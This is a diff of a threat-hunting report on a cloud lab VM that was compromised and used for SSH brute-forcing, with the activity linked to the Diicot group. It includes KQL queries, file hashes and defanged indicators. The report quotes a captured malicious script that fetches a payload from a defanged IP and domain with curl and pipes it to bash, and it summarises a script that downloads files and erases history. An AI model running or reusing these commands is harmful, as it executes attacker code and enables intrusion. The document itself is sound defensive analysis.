@@ -11,7 +11,7 @@ This report summarizes the findings of a threat hunting investigation conducted 
 
 ### Hypothesis:
 
-The virtual machine with public IP "20[.]81[.]228[.]191" has been compromised and is actively conducting brute-force attacks on external public systems from the CyberRange network.
+The virtual machine with public IP `20[.]81[.]228[.]191` has been compromised and is actively conducting brute-force attacks on external public systems from the CyberRange network.
 
 <u>Query</u>
 
@@ -22,8 +22,8 @@ DeviceInfo
 | project Timestamp, DeviceName, PublicIP, OSPlatform, LoggedOnUsers
 ```
 
-Using the the public IP in a query, the device name of the suspected system was discovered to be, "sakel-lunix-2.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net"
-After identifying the device associated with the flagged IP address, the next step was to verify if a SSH brute force attack was conducted from the suspected device. Using the device’s name in a new query, the "DeviceNetworkEvents" table was searched.
+Using the the public IP in a query, the device name of the suspected system was discovered to be, `sakel-lunix-2.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net`
+After identifying the device associated with the flagged IP address, the next step was to verify if a SSH brute force attack was conducted from the suspected device. Using the device’s name in a new query, the `DeviceNetworkEvents` table was searched.
 
 <u>Query</u>
 
@@ -50,7 +50,7 @@ DeviceNetworkEvents
 | project Timestamp, ActionType, RemoteIP, RemotePort, RemoteIPType,InitiatingProcessCommandLine
 ```
 
-Network traffic consistent with an SSH brute-force attack was observed. The suspected device, "sakel-lunix-2", began its sequential IP scanning at "2025-03-14T17:46:53.755809Z". Network logs show that the VM sent over 30,000 connection requests to other systems on port 22. And a closer inspection of the initiating process’s command line revealed a script executing the activity.
+Network traffic consistent with an SSH brute-force attack was observed. The suspected device, `sakel-lunix-2`, began its sequential IP scanning at `2025-03-14T17:46:53.755809Z`. Network logs show that the VM sent over 30,000 connection requests to other systems on port 22. And a closer inspection of the initiating process’s command line revealed a script executing the activity.
 
 <u>Script</u>:
 
@@ -60,17 +60,17 @@ Network traffic consistent with an SSH brute-force attack was observed. The susp
 
 <u>Script Actions</u>
 
-● Deletes and recreates "/var/tmp/Documents", likely to remove traces of previous files
-● Modifies file attributes using "chattr -iae", which can make files immutable
-● Moves potentially malicious files ('diicot', 'kuak') into '/var/tmp/Documents', renames them, and makes them executable
-● Removes crontab entries ('crontab -r'), possibly to remove traces of previous persistence mechanisms
-● Deletes SSH authorized keys ('~/.ssh/authorized_keys'), likely preventing backdoor access removal
-● Kills various processes ('Opera', 'cnrig', 'java', 'xmrig')
-● Downloads a file ('.balu') from '85[.]31[.]47[.]99' and executes it under the name cache
-● Clears command history ('history -c', 'rm -rf .bash_history')
-● Deletes '/tmp/cache', likely removing execution traces
+● Deletes and recreates `/var/tmp/Documents`, likely to remove traces of previous files
+● Modifies file attributes using `chattr -iae`, which can make files immutable
+● Moves potentially malicious files (`diicot`, `kuak`) into `/var/tmp/Documents`, renames them, and makes them executable
+● Removes crontab entries (`crontab -r`), possibly to remove traces of previous persistence mechanisms
+● Deletes SSH authorized keys (`~/.ssh/authorized_keys`), likely preventing backdoor access removal
+● Kills various processes (`Opera`, `cnrig`, `java`, `xmrig`)
+● Downloads a file (`.balu`) from `85[.]31[.]47[.]99` and executes it under the name cache
+● Clears command history (`history -c`, `rm -rf .bash_history`)
+● Deletes `/tmp/cache`, likely removing execution traces
 
-Analyzing the script reveals several noteworthy actions. It references two non-native executable files, diicot and kuak, and moves them to a system temporary directory. Since '/var/tmp/' is both writable and temporary, threat actors commonly use it to store and execute malicious files without requiring elevated privileges. Verifying whether the 'diicot' or 'kuak' files were malicious or not became imperative. To inspect both files, a query was executed using the 'DeviceFileEvents' table and file names to retrieve their respective SHA256 hash values for analysis.
+Analyzing the script reveals several noteworthy actions. It references two non-native executable files, `diicot` and `kuak`, and moves them to a system temporary directory. Since `/var/tmp/` is both writable and temporary, threat actors commonly use it to store and execute malicious files without requiring elevated privileges. Verifying whether the `diicot` or `kuak` files were malicious or not became imperative. To inspect both files, a query was executed using the `DeviceFileEvents` table and file names to retrieve their respective SHA256 hash values for analysis.
 
 <u>Query</u>
 
@@ -85,19 +85,19 @@ The query returned the SHA-256 hashes for both files, which were then analyzed u
 malicious file.
 
 **diicot**
-SHA256: '9462261543bfaf008f4748c76a7a2aec95d67f73315d1adea1833d51f9ec29f6'
+SHA256: `9462261543bfaf008f4748c76a7a2aec95d67f73315d1adea1833d51f9ec29f6`
 
 **kauk**
-SHA256: '11d43b9ef1678a889cfbca33ca13314d07824753965cafb28d4030644a2c5ccd'
+SHA256: `11d43b9ef1678a889cfbca33ca13314d07824753965cafb28d4030644a2c5ccd`
 
-Revisiting the script used in the SSH brute force attack, the script executed both a 'curl' and a 'wget' command to download a file from the IP address '85[.]31[.]47[.]99'. The script's redundancy on the IP address emphasized the importance of retrieving the file from the designated IP. Analyzing the IP address found in the script using VirusTotal revealed that '85[.]31[.]47[.]99' is classified as a malicious site. Navigating to the “Relations” section on VirusTotal, several domains associated with the malicious IP address were found.
+Revisiting the script used in the SSH brute force attack, the script executed both a `curl` and a `wget` command to download a file from the IP address `85[.]31[.]47[.]99`. The script's redundancy on the IP address emphasized the importance of retrieving the file from the designated IP. Analyzing the IP address found in the script using VirusTotal revealed that `85[.]31[.]47[.]99` is classified as a malicious site. Navigating to the “Relations” section on VirusTotal, several domains associated with the malicious IP address were found.
 
 <u>Domains</u>
 
 - digitaldatainsights[.]org
 - digital[.]digitaldatainsights[.]org
 
-The 'DeviceNetworkEvents' table was queried to determine whether the compromised system had successfully connected to the specified IP address. A thorough inspection of the network logs revealed that no successful connection had occurred. Concluding that no successful connection had occurred, the domain associated with the IP address was used in several queries to search across multiple log tables. Another script was found in the 'DeviceEvents' table that explicitly referenced the domain name in the code. The script discovered:
+The `DeviceNetworkEvents` table was queried to determine whether the compromised system had successfully connected to the specified IP address. A thorough inspection of the network logs revealed that no successful connection had occurred. Concluding that no successful connection had occurred, the domain associated with the IP address was used in several queries to search across multiple log tables. Another script was found in the `DeviceEvents` table that explicitly referenced the domain name in the code. The script discovered:
 
 ```powershell
 #!/bin/bash\nif curl -s --connect-timeout 15 196[.]251[.]114[.]67/.x/black3; then\n curl -s 196[.]251[.]114[.]67/.x/black3 | bash >/dev/null 2>&1\nelse\n curl -s --connect-timeout 15 digital[.]digitaldatainsights[.]org/.x/black3 | bash >/dev/null 2>&1\nfi\n
@@ -105,15 +105,15 @@ The 'DeviceNetworkEvents' table was queried to determine whether the compromised
 
 <u>Script Actions</u>
 
-● 'curl -s --connect-timeout 15 196[.]251[.]114[.]67/.x/black3': attempts to fetch a file named black3 from the IP address '196[.]251[.]114[.]67'
-● 'curl -s 196[.]251[.]114[.]67/.x/black3 | bash >/dev/null 2>&1': if the first curl attempt is successful, the script pipes the contents of the black3 file directly to bash, which will execute the commands in the file
+● `curl -s --connect-timeout 15 196[.]251[.]114[.]67/.x/black3`: attempts to fetch a file named black3 from the IP address `196[.]251[.]114[.]67`
+● `curl -s 196[.]251[.]114[.]67/.x/black3 | bash >/dev/null 2>&1`: if the first curl attempt is successful, the script pipes the contents of the black3 file directly to bash, which will execute the commands in the file
 ● If the first server is unreachable, it tries to fetch the payload from the second IP address and again pipes it to bash to execute
 
-A quick inspection of the IP address '196[.]251[.]114[.]67' with VirusTotal reveals that the IP address is classified as malicious as well. Another search of the 'DeviceNetworkEvents' table for successful connections with the new, malicious IP address returned no results. Suggesting that the threat actor was also unable to connect to the second IP address. At this stage of the investigation, sufficient artifacts and indicators had been collected and verified to conduct OSINT using available public information. Referencing the malicious files, IP addresses, and script code, a relevant threat report from **WIZ** was identified. The threat report focused on an active malware campaign being undergone by the threat group **Diicot** . The reported Diicot payload names, hashes, and indicators closely matched the activity observed within the CyberRange. revealing several new indicators for further threat hunting.
+A quick inspection of the IP address `196[.]251[.]114[.]67` with VirusTotal reveals that the IP address is classified as malicious as well. Another search of the `DeviceNetworkEvents` table for successful connections with the new, malicious IP address returned no results. Suggesting that the threat actor was also unable to connect to the second IP address. At this stage of the investigation, sufficient artifacts and indicators had been collected and verified to conduct OSINT using available public information. Referencing the malicious files, IP addresses, and script code, a relevant threat report from **WIZ** was identified. The threat report focused on an active malware campaign being undergone by the threat group **Diicot** . The reported Diicot payload names, hashes, and indicators closely matched the activity observed within the CyberRange. Revealing several new indicators for further threat hunting.
 
 *The report: https://www.wiz.io/blog/diicot-threat-group-malware-campaign*
 
-In reference to the WIZ report, another indicator that suggests that the threat actor could possibly be the Diicot threat group, are several instances of Romanian words found in the scripts being utilized. A query utilizing the Romanian phrase 'în câmpul' was used to extract logs containing Romanian words.
+In reference to the WIZ report, another indicator that suggests that the threat actor could possibly be the Diicot threat group, are several instances of Romanian words found in the scripts being utilized. A query utilizing the Romanian phrase `în câmpul` was used to extract logs containing Romanian words.
 
 <u>Query</u>
 
@@ -138,7 +138,7 @@ Translated Script:
 
 ## Payloads
 
-A notorious file that the Diicot threat group utilizes in their malware campaign is a file named 'Update'. This file appears on cloud machines hosted on Azure which run OpenSSH and is typically flagged by a YARA rule for UPX-packed files. Wiz categorizes the file and additional components of the malware as '/var/tmp/.update-logs/Update'. It is identified as the primary payload in Diicot’s attacks. It contains the main logic that includes spreading to other targets, maintaining persistence, and uploading results to the attacker’s server. Typically when executed, it drops an additional two embedded malicious files on the system. Inspecting the known compromised system for a file named similarly, returned a log with not just with the same file name but also the exact folder path as documented Diicot payloads.
+A notorious file that the Diicot threat group utilizes in their malware campaign is a file named `Update`. This file appears on cloud machines hosted on Azure which run OpenSSH and is typically flagged by a YARA rule for UPX-packed files. Wiz categorizes the file and additional components of the malware as `/var/tmp/.update-logs/Update`. It is identified as the primary payload in Diicot’s attacks. It contains the main logic that includes spreading to other targets, maintaining persistence, and uploading results to the attacker’s server. Typically when executed, it drops an additional two embedded malicious files on the system. Inspecting the known compromised system for a file named similarly, returned a log with not just with the same file name but also the exact folder path as documented Diicot payloads.
 
 <u>Query</u>
 
@@ -149,13 +149,13 @@ DeviceFileEvents
 | project Timestamp, ActionType, FileName, FolderPath, InitiatingProcessAccountDomain, InitiatingProcessAccountName, SHA256
 ```
 
-The log revealed that this file was initiated by the account name 'root' in the account domain 'sakel-linux-2'. The file’s initiating file process name was 'upzbubnv' with the corresponding command line: './UpzBUBnv'. The hash values of the 'Update' file are the following,
+The log revealed that this file was initiated by the account name `root` in the account domain `sakel-linux-2`. The file’s initiating file process name was `upzbubnv` with the corresponding command line: `./UpzBUBnv`. The hash values of the `Update` file are the following,
 
-SHA1: '9f1bbb9be5024d24c64b597abe7ede2c8feaccd7'
-SHA256: '5078b85ae87a55d0299682e3123d5c7a804df03266eba49fd404a9cec98470ba'
-MD5: '0342a25887a6943cd325ccda19d3f0df'
+SHA1: `9f1bbb9be5024d24c64b597abe7ede2c8feaccd7`
+SHA256: `5078b85ae87a55d0299682e3123d5c7a804df03266eba49fd404a9cec98470ba`
+MD5: `0342a25887a6943cd325ccda19d3f0df`
 
-These hashes have yet to be labeled as malicious by public online services such as VirusTotal. This is likely a result of a known Diicot technique in which they modify a file’s UPX header. Diicot obfuscates the group’s payloads UPX headers '(T1027.002)' and corrupts the checksum information in the headers. These techniques are meant to bypass analysis tools and avoid detection by automated systems. Understanding that this was possibly the main payload Diicot utilized, I expanded my search to inspect other systems in the network from 5 months ago with the following query,
+These hashes have yet to be labeled as malicious by public online services such as VirusTotal. This is likely a result of a known Diicot technique in which they modify a file’s UPX header. Diicot obfuscates the group’s payloads UPX headers `T1027.002` and corrupts the checksum information in the headers. These techniques are meant to bypass analysis tools and avoid detection by automated systems. Understanding that this was possibly the main payload Diicot utilized, I expanded my search to inspect other systems in the network from 5 months ago with the following query,
 
 <u>Query</u>
 
@@ -166,7 +166,7 @@ DeviceFileEvents
 | project Timestamp, DeviceName, ActionType, FolderPath, InitiatingProcessAccountDomain, InitiatingProcessAccountName
 ```
 
-The query returned three more entries that shared the same file name, folder path, and hashes. The 'Update' file was created in three other devices, all initiated by distinct file names and command lines. The following is information of each respective log in chronological order,
+The query returned three more entries that shared the same file name, folder path, and hashes. The `Update` file was created in three other devices, all initiated by distinct file names and command lines. The following is information of each respective log in chronological order,
 
 Device Name: linux-program-fix.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net
 Time: 2025-03-04T17:52:53.939295Z
